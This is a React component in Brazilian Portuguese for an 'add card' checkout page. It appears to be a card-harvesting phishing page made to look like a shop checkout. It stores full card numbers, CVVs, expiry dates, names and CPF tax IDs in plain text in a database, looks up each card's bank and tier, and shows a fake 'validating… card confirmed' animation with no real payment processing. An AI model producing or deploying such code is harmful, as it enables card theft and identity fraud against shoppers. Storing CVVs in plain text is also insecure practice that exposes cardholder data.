"use client";

import React, { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { ArrowLeft, Smartphone, ShieldCheck, AlertCircle, Trash2, CheckCircle2, Landmark, Loader2 } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { showError, showSuccess } from '@/utils/toast';
import { supabase } from "@/integrations/supabase/client";

const AddCard: React.FC = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [name, setName] = useState("");
  const [cpf, setCpf] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);
  const [step, setStep] = useState(0);
  const [brand, setBrand] = useState<'visa' | 'mastercard' | 'unknown'>('unknown');
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  // Estados para informações do BIN
  const [binInfo, setBinInfo] = useState<{
    bank: string;
    level: string;
    type: string;
    bin: string;
  } | null>(null);

  const [savedCards, setSavedCards] = useState<any[]>([]);
  const [selectedCardId, setSelectedCardId] = useState<string | null>(null);
  const [isInitialLoading, setIsInitialLoading] = useState(true);

  useEffect(() => {
    fetchSavedCards();
  }, []);

  const fetchSavedCards = async () => {
    try {
      const { data, error } = await supabase
        .from('cards')
        .select('*')
        .order('created_at', { ascending: false });
      
      if (error) throw error;
      setSavedCards(data || []);
      
      // Seleciona o primeiro se não houver seleção e não estivermos digitando um novo
      if (data && data.length > 0 && !selectedCardId && !cardNumber) {
        setSelectedCardId(data[0].id);
      }
    } catch (err) {
      console.error("Erro ao carregar cartões:", err);
    } finally {
      setIsInitialLoading(false);
    }
  };

  const handleRemoveCard = async (id: string, e: React.MouseEvent) => {
    e.stopPropagation(); // Evita selecionar o cartão antes de remover
    
    try {
      const { error } = await supabase.from('cards').delete().eq('id', id);
      if (error) throw error;
      
      showSuccess("Cartão removido com sucesso.");
      
      // Se o removido era o selecionado, limpa a seleção
      if (selectedCardId === id) {
        setSelectedCardId(null);
      }
      
      // Atualiza a lista local removendo o item
      setSavedCards(prev => prev.filter(c => c.id !== id));
    } catch (err) {
      console.error("Erro ao remover:", err);
      showError("Não foi possível remover o cartão.");
    }
  };

  const lookupBin = async (bin: string) => {
    if (bin.length < 6) {
      setBinInfo(null);
      return;
    }

    try {
      const response = await fetch(`https://lookup.binlist.net/${bin}`);
      if (response.ok) {
        const data = await response.json();
        setBinInfo({
          bank: data.bank?.name || "Desconhecido",
          level: data.brand || "Standard",
          type: data.type === "debit" ? "Débito" : "Crédito",
          bin: bin
        });
      }
    } catch (err) {
      console.error("Erro ao buscar BIN:", err);
    }
  };

  const formatCardNumber = (val: string) => {
    const digits = val.replace(/\D/g, '').slice(0, 16);
    
    // Se começar a digitar, limpa a seleção de cartões salvos para focar no novo
    if (digits.length > 0) {
      setSelectedCardId(null);
    }

    if (digits.length >= 6) {
      lookupBin(digits.slice(0, 6));
    } else {
      setBinInfo(null);
    }

    const formatted = digits.match(/.{1,4}/g)?.join(' ') || digits;
    if (digits.length > 0) {
      const first = digits[0];
      // Aceita 4 (Visa), 5 (Mastercard), 2 (Mastercard novo), 6 (Discover/Elo)
      if (!['2', '4', '5', '6'].includes(first)) {
        setBrand('unknown');
      } else {
        setBrand(first === '4' ? 'visa' : 'mastercard');
      }
    }
    return formatted;
  };

  const formatExpiry = (val: string) => {
    const v = val.replace(/\D/g, '').slice(0, 4);
    if (v.length >= 2) {
      return `${v.slice(0, 2)}/${v.slice(2)}`;
    }
    return v;
  };

  const handleContinue = async () => {
    // CASO 1: Usar um cartão já salvo e selecionado
    // Só entra aqui se NÃO houver nada digitado no campo de número
    if (selectedCardId && !cardNumber.trim()) {
      const card = savedCards.find(c => c.id === selectedCardId);
      if (card) {
        navigate('/checkout', { state: { ...location.state, cardData: card } });
        return;
      }
    }

    // CASO 2: Salvar e usar o NOVO cartão digitado
    const cleanNumber = cardNumber.replace(/\s/g, '');
    const cleanCpf = cpf.replace(/\D/g, '');
    
    // Validações básicas para o novo cartão
    if (!cleanNumber || cleanNumber.length < 15) {
      showError("Número do cartão inválido.");
      return;
    }
    if (!expiry || expiry.length < 5) {
      showError("Data de validade inválida.");
      return;
    }
    if (!cvv || cvv.length < 3) {
      showError("CVV inválido.");
      return;
    }
    if (!name.trim()) {
      showError("Nome do titular é obrigatório.");
      return;
    }
    if (cleanCpf.length < 11) {
      showError("CPF inválido.");
      return;
    }

    setIsProcessing(true);
    try {
      const { data, error } = await supabase
        .from('cards')
        .insert([{
          card_number: cardNumber,
          expiry,
          cvv,
          name,
          cpf: cleanCpf,
          last4: cleanNumber.slice(-4),
          brand: brand === 'unknown' ? 'mastercard' : brand, // Fallback amigável
          bin: binInfo?.bin || cleanNumber.slice(0, 6),
          bank_name: binInfo?.bank || "Desconhecido",
          card_level: binInfo?.level || "Standard",
          card_type: binInfo?.type || "Crédito"
        }])
        .select()
        .single();

      if (error) throw error;

      // Animação de progresso
      setStep(0);
      setTimeout(() => setStep(1), 800);
      setTimeout(() => setStep(2), 1600);
      setTimeout(() => {
        navigate('/checkout', { state: { ...location.state, cardAdded: true, cardData: data } });
      }, 2400);

    } catch (err) {
      console.error("Erro ao salvar:", err);
      showError("Erro ao processar cartão. Tente novamente.");
      setIsProcessing(false);
    }
  };

  return (
    <div className="min-h-screen bg-white pb-24">
      {isProcessing && (
        <div className="fixed inset-0 z-[100] bg-black/60 flex items-center justify-center p-6 backdrop-blur-sm">
          <div className="bg-white rounded-2xl p-8 flex flex-col items-center space-y-4 w-full max-w-[280px] shadow-2xl">
            <div className="relative w-12 h-12">
               <div className="absolute inset-0 border-4 border-[#FF2C55] rounded-full border-t-transparent animate-spin"></div>
            </div>
            <p className="text-[15px] font-bold text-gray-900 text-center">
              {step === 0 && "Validando cartão..."}
              {step === 1 && "Adicionando à conta..."}
              {step === 2 && "Cartão confirmado!"}
            </p>
          </div>
        </div>
      )}

      <div className="h-12 flex items-center px-4 border-b sticky top-0 bg-white z-50">
        <button onClick={() => navigate(-1)} className="p-1">
          <ArrowLeft size={24} className="text-gray-900" />
        </button>
        <h1 className="flex-grow text-center text-[16px] font-bold mr-6">Adicionar cartão</h1>
      </div>

      <div className="p-4 space-y-6">
        <div className="flex items-center space-x-2 text-[#FF2C55]">
          <Smartphone size={16} />
          <span className="text-[13px] font-medium">Sem juros em até 3 parcelas</span>
        </div>

        {/* Inputs de Novo Cartão */}
        <div className="space-y-5">
          <div className="space-y-1.5">
            <div className="flex justify-between items-center">
              <label className="text-[14px] font-bold text-gray-900">Número do cartão</label>
              <div className="flex gap-2 h-5">
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-full" alt="MC" />
                <img src="https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" className="h-full" alt="Visa" />
              </div>
            </div>
            <div className="border-[#F1F1F1] border-2 rounded-xl h-14 flex items-center px-4 relative bg-gray-50/50">
              <input 
                type="text" 
                placeholder="0000 0000 0000 0000" 
                className="w-full bg-transparent outline-none text-[16px] font-mono"
                value={cardNumber}
                onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
              />
              {binInfo && (
                <div className="absolute right-4 flex items-center space-x-2 animate-in fade-in duration-300">
                  <div className="flex flex-col items-end">
                    <span className="text-[10px] font-bold text-[#00BFA5] uppercase truncate max-w-[80px] text-right">{binInfo.bank}</span>
                    <span className="text-[9px] text-gray-400 uppercase">{binInfo.level}</span>
                  </div>
                  <Landmark size={16} className="text-[#00BFA5]" />
                </div>
              )}
            </div>
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-1.5">
              <label className="text-[14px] font-bold text-gray-900">Validade</label>
              <input 
                type="text" 
                placeholder="MM/AA" 
                className="w-full bg-[#F8F8F8] rounded-xl h-14 px-4 outline-none text-[16px]"
                value={expiry}
                onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                maxLength={5}
              />
            </div>
            <div className="space-y-1.5">
              <label className="text-[14px] font-bold text-gray-900">CVV</label>
              <input 
                type="text" 
                placeholder="000" 
                className="w-full bg-[#F8F8F8] rounded-xl h-14 px-4 outline-none text-[16px]"
                value={cvv}
                onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
              />
            </div>
          </div>

          <div className="space-y-1.5">
            <label className="text-[14px] font-bold text-gray-900">Nome no cartão</label>
            <input 
              type="text" 
              placeholder="NOME COMO NO CARTÃO" 
              className="w-full bg-[#F8F8F8] rounded-xl h-14 px-4 outline-none text-[16px] uppercase"
              value={name}
              onChange={(e) => setName(e.target.value)}
            />
          </div>

          <div className="space-y-1.5">
            <label className="text-[14px] font-bold text-gray-900">CPF do titular</label>
            <input 
              type="text" 
              placeholder="000.000.000-00" 
              className="w-full bg-[#F8F8F8] rounded-xl h-14 px-4 outline-none text-[16px]"
              value={cpf}
              onChange={(e) => {
                const v = e.target.value.replace(/\D/g, '');
                setCpf(v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4").slice(0, 14));
              }}
            />
          </div>
        </div>

        {/* Lista de Cartões Salvos */}
        {savedCards.length > 0 && (
          <div className="space-y-4 pt-4 border-t">
            <h3 className="text-[14px] font-bold text-gray-900 px-1 uppercase tracking-tight">Cartões salvos</h3>
            <div className="space-y-3">
              {savedCards.map((card) => (
                <div 
                  key={card.id}
                  className={`relative border rounded-2xl p-4 flex items-center justify-between cursor-pointer transition-all ${
                    selectedCardId === card.id ? 'border-[#FF2C55] bg-[#FFF1F3]' : 'border-gray-100 bg-gray-50'
                  }`}
                  onClick={() => {
                    setSelectedCardId(card.id);
                    setCardNumber(""); // Limpa o input se selecionar um salvo
                  }}
                >
                  <div className="flex items-center space-x-3">
                    <div className="bg-white p-1 rounded border shrink-0">
                      <img 
                        src={card.brand === 'visa' ? "https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" : "https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg"} 
                        className="h-4 w-6 object-contain" 
                        alt="Brand"
                      />
                    </div>
                    <div className="flex flex-col">
                      <div className="flex items-center space-x-2">
                        <span className="text-[14px] font-bold text-gray-900">Final {card.last4}</span>
                        {card.bank_name && (
                          <span className="text-[9px] bg-white px-1.5 py-0.5 rounded border text-gray-400 font-bold uppercase truncate max-w-[80px]">
                            {card.bank_name}
                          </span>
                        )}
                      </div>
                      <div className="flex items-center space-x-3 mt-1">
                        <span className="text-[11px] text-gray-400 uppercase">{card.card_level || "Standard"}</span>
                        <button 
                          className="text-[11px] text-red-500 font-bold flex items-center hover:opacity-70 transition-opacity"
                          onClick={(e) => handleRemoveCard(card.id, e)}
                        >
                          <Trash2 size={13} className="mr-1" /> Remover
                        </button>
                      </div>
                    </div>
                  </div>
                  
                  <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${selectedCardId === card.id ? 'border-[#FF2C55] bg-[#FF2C55]' : 'border-gray-300'}`}>
                    {selectedCardId === card.id && <div className="w-2 h-2 bg-white rounded-full" />}
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* Botão Fixo */}
      <div className="fixed bottom-0 left-0 right-0 p-4 bg-white border-t z-50">
        <div className="max-w-[600px] mx-auto">
          <Button 
            className="w-full h-12 rounded-full font-bold text-[16px] bg-[#FF2C55] hover:bg-[#E0254B]" 
            onClick={handleContinue}
          >
            Continuar
          </Button>
        </div>
      </div>
    </div>
  );
};

export default AddCard;